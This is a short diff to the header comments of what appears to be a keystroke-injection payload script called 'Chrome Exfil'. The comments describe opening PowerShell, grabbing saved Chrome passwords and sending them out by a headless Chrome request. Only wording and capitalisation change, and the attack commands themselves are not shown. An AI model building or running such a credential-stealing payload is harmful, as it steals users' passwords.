@@ -1,7 +1,7 @@
 REM Title: Chrome Exfil
 REM Author: thisismyrobot
-REM Description: Opens hidden powershell, grabs Chrome passwords, exfils via headless Chrome GET request.
-REM Target: Windows 10 (Powershell + Chrome)
+REM Description: Opens PowerShell, grabs Chrome passwords, exfils via headless Chrome GET request.
+REM Target: Windows 10 (PowerShell + Chrome)
 REM Version: 1.0
 REM Category: Exfiltration
 DEFAULTDELAY 10
